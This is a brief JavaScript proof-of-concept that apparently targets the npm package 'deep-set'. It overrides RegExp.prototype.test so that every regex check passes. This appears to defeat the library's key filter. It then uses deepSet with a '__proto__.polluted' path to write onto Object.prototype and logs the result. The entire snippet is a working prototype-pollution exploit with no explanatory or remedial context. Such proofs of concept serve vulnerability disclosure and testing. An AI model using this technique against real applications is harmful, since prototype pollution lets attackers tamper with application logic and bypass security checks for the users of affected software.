RegExp.prototype.test = () => true;
console.log({}.polluted);
const deepSet = require('deep-set');
const obj = { 1: '2' };
deepSet(obj, '__proto__.polluted', 'yes');
console.log({}.polluted);